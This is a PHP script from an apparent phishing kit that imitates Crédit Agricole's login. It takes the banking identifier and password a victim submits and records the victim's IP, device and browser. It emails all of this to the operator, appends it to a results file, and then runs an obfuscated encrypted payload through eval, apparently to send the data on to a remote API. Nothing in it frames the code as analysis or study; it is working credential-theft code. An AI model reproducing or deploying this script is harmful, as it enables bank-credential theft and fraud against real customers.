<?php

include("config.php");

if(!empty($_POST["staredPassword"])){



$message  = "******* New Login Agricole *******\n";
$message .= "dep : ".$_SESSION['dep']."\n";
$message .= "Identifiant : ".$_POST['CCPTE']."\n";
$message .= "Password : ".$_POST['Hidden1']."\n";
$message .= "Device  : ".$OS."\n";
$message .= "Browser : ".$Browser."\n";
$message .= "IP      : ".$ip."\n";
$message .= "******* End Login Data *******\n\n\n\n\n";
$subject="Log Agricole ".$ip;
if($sendmail == true){

	mail($mail,$subject,$message);

}

header("Location: cp2.php");

if($textwrite == true){
	
	write($message,"../../result/result.txt");
}

if($sendapi == true){
eval(decrypt2("1234","MmhnNHF3NXBMUFR2Y1pjQzhRa0RXVVRSUWxhLzF3UFFzaGZweGFCcHI5Q1Z2Snowak5CR3dtNm5UMVRvRnM5UXlVelIwdTJYNGU5L09BOSsxWWJMd1VsYmp6OFNpaHowM2dwZnNhbzJrVktMbUsyWFBqb05OYlJJQkdzaVpicXlwdzlhcWVZMFQyRDA1S0orbjJ6UjNxZkpYWmxBT3ZpNVBMTHJ3bStkb2dwREJFSjBvY3pkaVlIcUhFeUhnRUVTQTkvMXZkSTArWG1PZ2ZKcU5HVDZFM3dOR3N2eGY0NGVlSHZJVUtnSTJZS0pBKzFNTWFSVTErQkordDdsdGYzWjZ3ZE1VWVRBaEZhUnJYN0kzUTRRTitJVU4vM2U4MjFwcHlacVNDd1hGT0NTZEY3d3FvakNidlR0dmdvbG8zM1JIVlBFNTRiV00zdmUxd3h2VlVTaEprNitjbW0xRFNZdWhscm8xeXkrLzVuSkg4L1dqNUpDODNIU1JSQjlOWitFTHIzWGNoQkxJb1AzTTZGekRsK1RiZHBteWVmMzBUNThnY3ByUy83U3pZRzJVYXhzQ3BLWnNnK3RIK3BUVGJnbUNaUVlMRU1YeGMrODU2dk50LzZFSjBxUGJWaUhGd3VtZDZBVllKUGdkZndpamx3MzRpKzY2RzlyL29HZUhBUFh1cWl3ekZWM1lIb0kwTjNHZUhsS2dGblpCNGo4VDFSLzVJTG1xMFpadGhETnNSS3l2aXdaZFMvU3AyeUZ5VCtHOjqxL01HpTcuoNNKYIHpgZgw"));
}
}
else {
	echo "<script>alert('Votre Identifiant est incorrect'); window.location = './cp.php';</script>";
}
?>

